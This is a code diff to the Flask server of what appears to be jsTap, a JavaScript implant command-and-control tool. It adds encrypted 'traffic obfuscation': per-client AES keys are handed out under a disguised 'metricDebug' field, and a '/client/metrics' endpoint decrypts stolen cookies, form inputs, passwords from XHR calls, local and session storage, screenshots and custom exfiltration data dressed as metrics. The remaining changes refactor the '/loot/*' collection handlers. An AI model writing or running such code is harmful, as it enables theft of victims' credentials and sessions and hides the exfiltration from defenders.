@@ -17,7 +17,9 @@ from user_agents import parse
 from email.mime.text import MIMEText
 from flask_executor import Executor
 from apscheduler.schedulers.background import BackgroundScheduler
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import magic
+import base64
 import json
 import uuid
 import os
@@ -151,7 +153,7 @@ app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
 
 # Scoped Session Database setup
 database_uri = 'sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')
-engine       = create_engine(database_uri, connect_args={"check_same_thread": False})
+engine       = create_engine(database_uri, connect_args={"check_same_thread": False, "timeout": 15})
 db_session   = scoped_session(sessionmaker(autocommit=False, autoflush=False, bind=engine))
 Base         = declarative_base()
 Base.query   = db_session.query_property()
@@ -277,7 +279,8 @@ class Client(Base):
     hasJobs         = Column(Boolean, nullable=False, default=False)
     imageCounter    = Column(Integer, server_default='1')
     htmlCodeCounter = Column(Integer, server_default='1')
-
+    receiveKey      = Column(String(44), nullable=True)
+    sendKey         = Column(String(44), nullable=True)
 
     def update(self):
         # logger.info("$$ Client Update func")
@@ -508,6 +511,7 @@ class AppSettings(Base):
     emailEnable       = Column(Boolean, nullable=False, default=False)
     lastEmailSent     = Column(DateTime(timezone=True), nullable=True)
     emailContent      = Column(Text, nullable=True)
+    obfuscateTraffic  = Column(Boolean, default=False)
 
 
     def emailSent(self):
@@ -1086,8 +1090,15 @@ def afterRequestHeaders(response):
     response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
     response.headers['X-Content-Type-Options']    = 'nosniff'
     response.headers['X-Frame-Options']           = 'DENY'
-    response.headers['Content-Security-Policy']   = "default-src 'self' style-src 'self' script-src 'self' connect-sec 'self' img-src 'self' data: frame-ancestors 'none' object-src 'self'  'unsafe-inline'"
-
+    response.headers['Content-Security-Policy']   = (
+        "default-src 'self'; "
+        "style-src 'self' 'unsafe-inline'; "
+        "script-src 'self' 'unsafe-inline'; "
+        "connect-src 'self'; "
+        "img-src 'self' data:; "
+        "frame-ancestors 'none'; "
+        "object-src 'self'"
+    )
     # Server header is set in main function
  
     return response
@@ -1224,6 +1235,7 @@ def returnUUID(tag=''):
         ip = request.headers.get('X-Forwarded-For')
     else:
         ip = request.remote_addr
+ 
     blockedIP = BlockedIP.query.filter_by(ip=ip).first()
     if blockedIP is not None:
         return "No.", 401
@@ -1238,7 +1250,7 @@ def returnUUID(tag=''):
 
     # Database Entry
     newNickname = generateNickname()
-    newClient   = Client(uuid=str(token), nickname=newNickname, tag=tag, notes="")
+    newClient   = Client(uuid=str(token), nickname=newNickname, tag=tag, notes="", receiveKey=None, sendKey=None)
     db_session.add(newClient)
     db_session.commit()
 
@@ -1275,6 +1287,209 @@ def returnUUID(tag=''):
 
 
 
+# Check if we're using traffic obfuscation
+# and if we are return IV and key
+@app.route('/client/metricSettings/<identifier>', methods=['GET'])
+def getObfuscationSettings(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    appSettings = AppSettings.query.filter_by(id=1).first()
+
+    encryptionData = {}
+
+    if appSettings.obfuscateTraffic:
+        client = Client.query.filter_by(uuid=identifier).first()
+
+        receiveKey = os.urandom(32)
+        sendKey    = os.urandom(32)
+
+        client.receiveKey = receiveKey
+        client.sendKey    = sendKey
+
+        db_session.add(client)
+        dbCommit()
+
+        # Get rid of dashes in UUID session identifier
+        identifierBytes = bytes.fromhex(identifier.replace('-', ''))
+
+        # rotate the UUID for some light obfuscation
+        shift        = 7 % len(identifierBytes)
+        rotatedBytes = identifierBytes[shift:] + identifierBytes[:shift]
+
+        #xor up
+        plaintextData = sendKey + receiveKey
+
+        maskRepeated = (rotatedBytes * ((len(plaintextData) // len(rotatedBytes)) + 1))[:len(plaintextData)]
+        obfuscatedData = bytes(a ^ b for a, b in zip(plaintextData, maskRepeated))
+
+        encryptionData["enable"]      = "true"
+        encryptionData["metricDebug"] = base64.b64encode(obfuscatedData).decode("utf-8")
+    else:
+        encryptionData["enable"]      = "false"
+        encryptionData["metricDebug"] = ""
+
+
+    return jsonify(encryptionData)
+
+
+
+
+# Receive encrypted data from js-tap client
+# Used when obfuscation is enabled in App Settings (UI menu in portal)
+@app.route('/client/metrics/<identifier>', methods=['POST'])
+def receiveEncryptedMessage(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    userAgent = request.headers.get('User-Agent')
+   
+    content = request.json
+    payload = content['metricData']
+
+    parts = payload.split(',')
+
+    if len(parts) != 3:
+        logger.error("Invalid numer of parts in /client/metrics")
+
+    iv = base64.b64decode(parts[0])
+
+    pathCipherText = base64.b64decode(parts[1])
+
+    messageCipherText = base64.b64decode(parts[2])
+
+    client = Client.query.filter_by(uuid=identifier).first()
+    aesgcm = AESGCM(client.receiveKey)
+
+    path    = aesgcm.decrypt(iv, pathCipherText, None)
+    message = aesgcm.decrypt(iv, messageCipherText, None)
+
+    if path.decode('utf-8') == "/client/fingerprint":
+        logger.info("Received encrypted fingerprint message")
+        saveFingerprint(identifier, message.decode('utf-8'))
+
+    elif path.decode('utf-8') == "/loot/html":
+        logger.info("Received encrypted HTML dump message")
+        jsonData = json.loads(message.decode('utf-8'))
+        url         = jsonData['url']
+        htmlContent = jsonData['html']
+        saveHTML(identifier, url, htmlContent, ip, userAgent)
+
+    elif path.decode('utf-8') == "/loot/input":
+        logger.info("Received encrypted input message")
+        jsonData = json.loads(message.decode('utf-8'))
+        saveInput(identifier, jsonData, ip, userAgent)
+ 
+    elif path.decode('utf-8') == "/loot/location":
+        logger.info("Received encrypted location message")
+        jsonData = json.loads(message.decode('utf-8'))
+        url      = jsonData['url']
+        saveUrl(identifier, url, ip, userAgent)
+
+    elif path.decode('utf-8') == "/loot/dessert":
+        logger.info("Received encrypted cookie message")
+        jsonData = json.loads(message.decode('utf-8'))
+        cookieName  = jsonData['cookieName']
+        cookieValue = jsonData['cookieValue']
+        saveCookie(identifier, cookieName, cookieValue, ip, userAgent)
+
+    elif path.decode('utf-8') == "/loot/localstore":
+        logger.info("Received encrypted local storage message")
+        jsonData = json.loads(message.decode('utf-8'))
+        localStorageKey   = jsonData['key']
+        localStorageValue = jsonData['value']
+        saveLocalStorage(identifier, localStorageKey, localStorageValue, ip, userAgent)
+
+    elif path.decode('utf-8') == "/loot/sessionstore":
+        logger.info("Received encrypted session storage message")
+        jsonData = json.loads(message.decode('utf-8'))
+        sessionStorageKey    = jsonData['key']
+        sessionStorageValue = jsonData['value']
+        saveSessionStorage(identifier, sessionStorageKey, sessionStorageValue, ip, userAgent)
+
+    elif path.decode('utf-8') == "/loot/xhrRequest":
+        logger.info("Received encrypted xhrRequest message")
+        jsonData = json.loads(message.decode('utf-8'))
+        saveXhrDump(identifier, jsonData, ip, userAgent)
+
+    elif path.decode('utf-8') == "/loot/fetchRequest":
+        logger.info("Received encrypted fetchRequest message")
+        jsonData = json.loads(message.decode('utf-8'))
+        saveFetchDump(identifier, jsonData, ip, userAgent)
+
+    elif path.decode('utf-8') == "/loot/formPost":
+        logger.info("Received encrypted formPost message")
+        jsonData = json.loads(message.decode('utf-8'))
+        saveFormPost(identifier, jsonData, ip, userAgent)
+    
+    elif path.decode('utf-8') == "/loot/customData":
+        logger.info("Received encrypted custom data exfil message")
+        jsonData = json.loads(message.decode('utf-8'))
+        note     = jsonData['note']
+        data     = jsonData['data']
+        saveCustomExfil(identifier, note, data, ip, userAgent)
+
+    elif path.decode('utf-8') == "/loot/screenshot":
+        logger.info("Received encrypted screenshot message")
+
+        file_type = magic.from_buffer(message, mime=True)
+
+        if file_type != 'image/png':
+            logger.error("!!!! Wrong screenshot filetype!")
+            logger.error("---- Type: " + file_type)
+            return "No.", 401
+
+        lootDir = findLootDirectory(identifier)
+
+        client_data = Client.query.with_entities(Client.imageCounter).filter_by(uuid=identifier).first()
+        imageNumber = client_data[0]
+        file_path = os.path.join(dataDirectory, "lootFiles", lootDir, f"{imageNumber}_Screenshot.png")
+ 
+        with open(file_path, "wb") as binary_file:
+            binary_file.write(message)
+        # Record the screenshot event in the DB.
+        newScreenshot = Screenshot(clientID=identifier, fileName="./lootFiles/" + lootDir + "/" + f"{imageNumber}_Screenshot.png")
+        db_session.add(newScreenshot)
+        db_session.execute(update(Client).where(Client.uuid == identifier).values(imageCounter=Client.imageCounter+1))
+        dbCommit()
+
+        db_session.refresh(newScreenshot)
+        newEvent = Event(clientID=identifier, timeStamp=newScreenshot.timeStamp, 
+            eventType='SCREENSHOT', eventID=newScreenshot.id)
+        db_session.add(newEvent)
+        dbCommit()
+
+    elif path.decode('utf-8') == "/client/taskCheck":
+        logger.info("Received encrypted task check request message")
+        return createTaskResponse(identifier)
+
+
+    else:
+        logger.error("Invalid path in receiveEncryptedMessage")
+
+
+    return "ok", 200
+
+
+
+
+
+
+
+# unencrypted and encrypted calls end up here 
+def saveFingerprint(identifier, fingerprint):
+    client = Client.query.filter_by(uuid=identifier).first()
+    client.fingerprint = fingerprint 
+
+    db_session.add(client)
+    dbCommit()
+
+
 
 
 # Report the client fingerprint if setup to calculate one
@@ -1286,24 +1501,19 @@ def setFingerprint(identifier):
     content     = request.json
     fingerprint = content['fingerprint']
 
-    client = Client.query.filter_by(uuid=identifier).first()
-    client.fingerprint = fingerprint 
+    saveFingerprint(identifier, fingerprint)
+    # client = Client.query.filter_by(uuid=identifier).first()
+    # client.fingerprint = fingerprint 
 
-    db_session.add(client)
-    dbCommit()
+    # db_session.add(client)
+    # dbCommit()
 
     return "ok", 200
 
 
 
-
-
-# Check for custom payload jobs for the client
-@app.route('/client/taskCheck/<identifier>', methods=['GET'])
-def returnPayloads(identifier):
-    if not isClientSessionValid(identifier):
-        return "No.", 401
-
+# For use by both normal requests and obfuscated requests
+def createTaskResponse(identifier):
     client = Client.query.filter_by(uuid=identifier).first()
 
     # Make sure we run the repeat run scheduler
@@ -1336,7 +1546,40 @@ def returnPayloads(identifier):
     if dbChange:
         dbCommit()
 
-    return jsonify(taskedPayloads)
+    # is obfuscation/encryption enabled?
+    if client.sendKey != None:
+        iv             = os.urandom(12)
+        aesgcm         = AESGCM(client.sendKey)
+        jsonString     = json.dumps(taskedPayloads)
+        plaintextBytes = jsonString.encode('utf-8')
+        ciphertext     = aesgcm.encrypt(iv, plaintextBytes, None)
+
+        encodedIv         = base64.b64encode(iv).decode('utf-8')
+        encodedCiphertext = base64.b64encode(ciphertext).decode('utf-8')
+
+        datapack = encodedIv + "," + encodedCiphertext
+
+        encryptedResponse = {
+            "metricData": datapack
+        }
+
+        return jsonify(encryptedResponse)
+    else:
+        # Normal not-encrypted/obfuscated response
+        return jsonify(taskedPayloads)
+
+
+
+
+
+# Check for custom payload jobs for the client
+@app.route('/client/taskCheck/<identifier>', methods=['GET'])
+def returnPayloads(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    return createTaskResponse(identifier)
+
 
 
 
@@ -1395,24 +1638,13 @@ def recordScreenshot(identifier):
     db_session.add(newEvent)
     dbCommit()
 
-
-
     return "ok", 200
 
 
 
-# Capture the HTML seen
-@app.route('/loot/html/<identifier>', methods=['POST'])
-def recordHTML(identifier):
-    # logger.info("Got HTML from: " + identifier)
-
-    if not isClientSessionValid(identifier):
-        return "No.", 401
-
+# save HTML content
+def saveHTML(identifier, url, html, ip, userAgent):
     lootDir = findLootDirectory(identifier)
-    content = request.json 
-    url = content['url']
-    trapHTML = content['html']
 
     client = Client.query.with_entities(Client.htmlCodeCounter).filter_by(uuid=identifier).first()
 
@@ -1421,22 +1653,15 @@ def recordHTML(identifier):
     lootFile = dataDirectory + "lootFiles/" + lootDir + "/" + str(htmlNumber) + "_htmlCopy.html"
 
     with open (lootFile, "w") as html_file:
-        html_file.write(trapHTML)
+        html_file.write(html)
         html_file.close()
 
 
     # Put it in the DB
-    newHtml = HtmlCode(clientID=identifier, url=content['url'],fileName = lootFile)
+    newHtml = HtmlCode(clientID=identifier, url=url,fileName = lootFile)
     db_session.add(newHtml)
 
-
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
-
-
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
+    clientSeen(identifier, ip, userAgent)
     db_session.execute(update(Client).where(Client.uuid == identifier).values(htmlCodeCounter=Client.htmlCodeCounter+1))
     dbCommit()
 
@@ -1448,7 +1673,51 @@ def recordHTML(identifier):
     dbCommit()
 
 
+
+
+# Capture the HTML seen
+@app.route('/loot/html/<identifier>', methods=['POST'])
+def recordHTML(identifier):
+    # logger.info("Got HTML from: " + identifier)
+
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    content = request.json 
+    url = content['url']
+    trapHTML = content['html']
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+
+    saveHTML(identifier, url, trapHTML, ip, request.headers.get('User-Agent'))
+
+
     return "ok", 200
+
+
+
+# For both obfuscated and non-obfuscated traffic
+def saveUrl(identifier, url, ip, userAgent):
+    # Put it in the DB
+    newUrl = UrlVisited(clientID=identifier, url=url)
+    db_session.add(newUrl)
+
+
+    clientSeen(identifier, ip, userAgent)
+    dbCommit()
+
+
+    # add to global event table
+    db_session.refresh(newUrl)
+    newEvent = Event(clientID=identifier, timeStamp=newUrl.timeStamp, 
+        eventType='URLVISITED', eventID=newUrl.id)
+    db_session.add(newEvent)
+    dbCommit()
+
 
 
 
@@ -1460,32 +1729,43 @@ def recordUrl(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
 
-    lootDir = findLootDirectory(identifier)
     content = request.json
     url = content['url']
     # logger.info("Got URL: " + url)
 
-    # Put it in the DB
-    newUrl = UrlVisited(clientID=identifier, url=content['url'])
-    db_session.add(newUrl)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
     else:
         ip = request.remote_addr
 
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
-    dbCommit()
 
-    # add to global event table
-    db_session.refresh(newUrl)
-    newEvent = Event(clientID=identifier, timeStamp=newUrl.timeStamp, 
-    eventType='URLVISITED', eventID=newUrl.id)
-    db_session.add(newEvent)
-    dbCommit()
+    saveUrl(identifier, url, ip, request.headers.get('User-Agent'))
+
 
     return "ok", 200
 
+
+
+# For both obfuscated and non-obfuscated traffic
+def saveInput(identifier, content, ip, userAgent):
+    inputData = content
+    inputName = inputData['inputName']
+    inputValue = inputData['inputValue']
+
+    # Put it in the DB
+    newInput = UserInput(clientID=identifier, inputName=inputName, inputValue=inputValue)
+    db_session.add(newInput)
+
+    clientSeen(identifier, ip, userAgent)
+    dbCommit()
+
+    # add to global event table
+    db_session.refresh(newInput)
+    newEvent = Event(clientID=identifier, timeStamp=newInput.timeStamp, 
+    eventType='USERINPUT', eventID=newInput.id)
+    db_session.add(newEvent)
+    dbCommit()    
 
 
 
@@ -1496,33 +1776,35 @@ def recordInput(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
 
-    lootDir = findLootDirectory(identifier)
     content = request.json
-    inputName = content['inputName']
-    inputValue = content['inputValue']
-    # logger.info("Got input: " + inputName + ", value: " + inputValue)
-
-
-    # Put it in the DB
-    newInput = UserInput(clientID=identifier, inputName=content['inputName'], inputValue=content['inputValue'])
-    db_session.add(newInput)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
     else:
         ip = request.remote_addr
 
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
+    saveInput(identifier, content, ip, request.headers.get('User-Agent'))
+
+    return "ok", 200
+
+
+
+# For both obfuscated and non-obfuscated traffic
+def saveCookie(identifier, cookieName, cookieValue, ip, userAgent):
+    # Put it in the DB
+    newCookie = Cookie(clientID=identifier, cookieName=cookieName, cookieValue=cookieValue)
+    db_session.add(newCookie)
+
+    clientSeen(identifier, ip, userAgent)
     dbCommit()
 
     # add to global event table
-    db_session.refresh(newInput)
-    newEvent = Event(clientID=identifier, timeStamp=newInput.timeStamp, 
-    eventType='USERINPUT', eventID=newInput.id)
+    db_session.refresh(newCookie)
+    newEvent = Event(clientID=identifier, timeStamp=newCookie.timeStamp, 
+        eventType='COOKIE', eventID=newCookie.id)
     db_session.add(newEvent)
     dbCommit()    
 
-    return "ok", 200
 
 
 
@@ -1535,33 +1817,40 @@ def recordCookie(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
 
-    lootDir = findLootDirectory(identifier)
-    content = request.json
-    cookieName = content['cookieName']
+    content     = request.json
+    cookieName  = content['cookieName']
     cookieValue = content['cookieValue']
     # logger.info("Cookie name: " + content['cookieName'] + ", value: " + content['cookieValue'])
 
-
-    # Put it in the DB
-    newCookie = Cookie(clientID=identifier, cookieName=cookieName, cookieValue=cookieValue)
-    db_session.add(newCookie)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
     else:
         ip = request.remote_addr
 
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
+    saveCookie(identifier, cookieName, cookieValue, ip, request.headers.get('User-Agent'))
+
+    return "ok", 200
+
+
+
+# For both obfuscated and non-obfuscated traffic
+def saveLocalStorage(identifier, localStorageKey, localStorageValue, ip, userAgent):
+    # Put it in the DB
+    newLocalStorage = LocalStorage(clientID=identifier, key=localStorageKey, value=localStorageValue)
+    db_session.add(newLocalStorage)
+
+    clientSeen(identifier, ip, userAgent)
     dbCommit()
 
     # add to global event table
-    db_session.refresh(newCookie)
-    newEvent = Event(clientID=identifier, timeStamp=newCookie.timeStamp, 
-    eventType='COOKIE', eventID=newCookie.id)
+    db_session.refresh(newLocalStorage)
+    newEvent = Event(clientID=identifier, timeStamp=newLocalStorage.timeStamp, 
+    eventType='LOCALSTORAGE', eventID=newLocalStorage.id)
     db_session.add(newEvent)
     dbCommit()    
 
-    return "ok", 200
+
 
 
 
@@ -1573,32 +1862,39 @@ def recordLocalStorageEntry(identifier):
         return "No.", 401
 
 
-    lootDir = findLootDirectory(identifier)
     content = request.json
     localStorageKey = content['key']
     localStorageValue = content['value']
 
-
-    # Put it in the DB
-    newLocalStorage = LocalStorage(clientID=identifier, key=localStorageKey, value=localStorageValue)
-    db_session.add(newLocalStorage)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
     else:
         ip = request.remote_addr
 
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
+
+    saveLocalStorage(identifier, localStorageKey, localStorageValue, ip, request.headers.get('User-Agent'))
+
+    return "ok", 200
+
+
+
+# For both obfuscated and non-obfuscated traffic
+def saveSessionStorage(identifier, sessionStorageKey, sessionStorageValue, ip, userAgent):
+    # Put it in the DB
+    newSessionStorage = SessionStorage(clientID=identifier, key=sessionStorageKey, value=sessionStorageValue)
+    db_session.add(newSessionStorage)
+
+    clientSeen(identifier, ip, userAgent)
     dbCommit()
 
     # add to global event table
-    db_session.refresh(newLocalStorage)
-    newEvent = Event(clientID=identifier, timeStamp=newLocalStorage.timeStamp, 
-    eventType='LOCALSTORAGE', eventID=newLocalStorage.id)
+    db_session.refresh(newSessionStorage)
+    newEvent  = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp, 
+    eventType ='SESSIONSTORAGE', eventID=newSessionStorage.id)
     db_session.add(newEvent)
     dbCommit()    
 
-    return "ok", 200
 
 
 
@@ -1609,30 +1905,19 @@ def recordSessionStorageEntry(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
  
-    lootDir = findLootDirectory(identifier)
     content = request.json 
     sessionStorageKey   = content['key']
     sessionStorageValue = content['value']
 
-    # Put it in the DB
-    newSessionStorage = SessionStorage(clientID=identifier, key=sessionStorageKey, value=sessionStorageValue)
-    db_session.add(newSessionStorage)
 
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
     else:
         ip = request.remote_addr
 
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
-    dbCommit()
 
+    saveSessionStorage(identifier, sessionStorageKey, sessionStorageValue, ip, request.headers.get('User-Agent'))
 
-    # add to global event table
-    db_session.refresh(newSessionStorage)
-    newEvent  = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp, 
-    eventType ='SESSIONSTORAGE', eventID=newSessionStorage.id)
-    db_session.add(newEvent)
-    dbCommit()    
 
     return "ok", 200
 
@@ -1640,13 +1925,8 @@ def recordSessionStorageEntry(identifier):
 
 
 
-# Dump the full XHR api call info
-@app.route('/loot/xhrRequest/<identifier>', methods=['POST'])
-def recordXhrDump(identifier):
-    if not isClientSessionValid(identifier):
-        return "No.", 401
-
-    content        = request.json
+# For both obfuscated and non-obfuscated traffic
+def saveXhrDump(identifier, content, ip, userAgent):
     method         = content.get('method')
     url            = content.get('url')
     asyncRequest   = content.get('async', True)
@@ -1657,13 +1937,9 @@ def recordXhrDump(identifier):
     responseBody   = content.get('responseBody')
     responseStatus = content.get('responseStatus')
 
+
     newXhrApiCall = XhrApiCall(clientID=identifier, method=method, url=url, asyncRequest=asyncRequest, user=user, password=password, requestBody=requestBody, responseBody=responseBody, responseStatus=responseStatus)
     db_session.add(newXhrApiCall)
-
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
 
     clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
@@ -1680,17 +1956,32 @@ def recordXhrDump(identifier):
 
     dbCommit()    
 
+
+
+
+
+# Dump the full XHR api call info
+@app.route('/loot/xhrRequest/<identifier>', methods=['POST'])
+def recordXhrDump(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    content = request.json
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    saveXhrDump(identifier, content, ip, request.headers.get('User-Agent'))
+
     return "ok", 200   
 
 
 
-# Dump the full Fetch api call info
-@app.route('/loot/fetchRequest/<identifier>', methods=['POST'])
-def recordFetchDump(identifier):
-    if not isClientSessionValid(identifier):
-        return "No.", 401
 
-    content        = request.json
+# For both obfuscated and non-obfuscated traffic
+def saveFetchDump(identifier, content, ip, userAgent):
     method         = content.get('method')
     url            = content.get('url')
     requestBody    = content.get('body')
@@ -1701,12 +1992,7 @@ def recordFetchDump(identifier):
     newFetchApiCall = FetchApiCall(clientID=identifier, method=method, url=url, requestBody=requestBody, responseBody=responseBody, responseStatus=responseStatus)
     db_session.add(newFetchApiCall)
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
-
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
+    clientSeen(identifier, ip, userAgent)
     dbCommit()
 
     # add to global event table
@@ -1719,23 +2005,34 @@ def recordFetchDump(identifier):
         newHeader = FetchHeader(apiCallID=newFetchApiCall.id, clientID=identifier, header=header, value=value)
         db_session.add(newHeader)
 
-    dbCommit()    
+    dbCommit()
+
+
+
+
+# Dump the full Fetch api call info
+@app.route('/loot/fetchRequest/<identifier>', methods=['POST'])
+def recordFetchDump(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    content = request.json
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    saveFetchDump(identifier, content, ip, request.headers.get('User-Agent'))
 
     return "ok", 200   
 
 
 
 
-# Record Form Posts
-@app.route('/loot/formPost/<identifier>', methods=['POST'])
-def recordFormPost(identifier):
 
-    if not isClientSessionValid(identifier):
-        return "No.", 401
-
-    # logger.info("## Recording Form Post")
-    content     = request.json
-
+# For both obfuscated and non-obfuscated traffic
+def saveFormPost(identifier, content, ip, userAgent):
     formName    = content.get('name', None)
     formAction  = content.get('action', None)  # This may be base64 encoded
     formMethod  = content.get('method', None)
@@ -1747,11 +2044,6 @@ def recordFormPost(identifier):
     newFormPost = FormPost(clientID=identifier, formName=formName, formAction=formAction, formMethod=formMethod, formEncType=formEncType, formData=formData, url=url)
     db_session.add(newFormPost)
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
-
     clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
@@ -1762,8 +2054,46 @@ def recordFormPost(identifier):
     db_session.add(newEvent)
     dbCommit()    
 
+
+
+
+
+# Record Form Posts
+@app.route('/loot/formPost/<identifier>', methods=['POST'])
+def recordFormPost(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    # logger.info("## Recording Form Post")
+    content = request.json
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    saveFormPost(identifier, content, ip, request.headers.get('User-Agent'))
+
     return "ok", 200
 
+
+
+
+
+# For both obfuscated and non-obfuscated traffic
+def saveCustomExfil(identifier, note, data, ip, userAgent):
+    newExfil = CustomExfil(note=note, data=data)
+    db_session.add(newExfil)
+
+    clientSeen(identifier, ip, userAgent)
+    dbCommit()
+
+    # add to global event table
+    db_session.refresh(newExfil)
+    newEvent  = Event(clientID=identifier, timeStamp=newExfil.timeStamp, 
+        eventType ='CUSTOMEXFIL', eventID=newExfil.id)
+    db_session.add(newEvent)
+    dbCommit()    
 
 
 
@@ -1779,23 +2109,12 @@ def recordCustomExfil(identifier):
     note = content.get('note', None)
     data = content.get('data', None)
 
-    newExfil = CustomExfil(note=note, data=data)
-    db_session.add(newExfil)
-
     if (proxyMode):
         ip = request.headers.get('X-Forwarded-For')
     else:
         ip = request.remote_addr
 
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
-    dbCommit()
-
-    # add to global event table
-    db_session.refresh(newExfil)
-    newEvent  = Event(clientID=identifier, timeStamp=newExfil.timeStamp, 
-    eventType ='CUSTOMEXFIL', eventID=newExfil.id)
-    db_session.add(newEvent)
-    dbCommit()    
+    saveCustomExfil(identifier, note, data, ip, request.headers.get('User-Agent'))
 
     return "ok", 200
 
@@ -2181,6 +2500,36 @@ def setClientStar(key):
     dbCommit()
 
     return "ok", 200
+
+
+
+@app.route('/api/app/obfuscateTraffic', methods=['GET'])
+@login_required
+def getObfuscateTrafficSetting():
+    appSettings = AppSettings.query.filter_by(id=1).first()
+
+    obfuscateDataSetting = {'obfuscateTraffic':appSettings.obfuscateTraffic}
+
+    return jsonify(obfuscateDataSetting)
+
+
+
+@app.route('/api/app/setObfuscateTraffic/<setting>', methods=['GET'])
+@login_required
+def setObfuscateTrafficSetting(setting):
+    appSettings = AppSettings.query.filter_by(id=1).first()
+   
+    if setting == 'true':
+        appSettings.obfuscateTraffic = True
+    elif setting == 'false':
+        appSettings.obfuscateTraffic = False
+    else:
+        logger.error("Invalid true/false value in setObfuscateTrafficSetting:" + setting)
+
+    dbCommit()
+
+    return "ok", 200
+
 
 
 
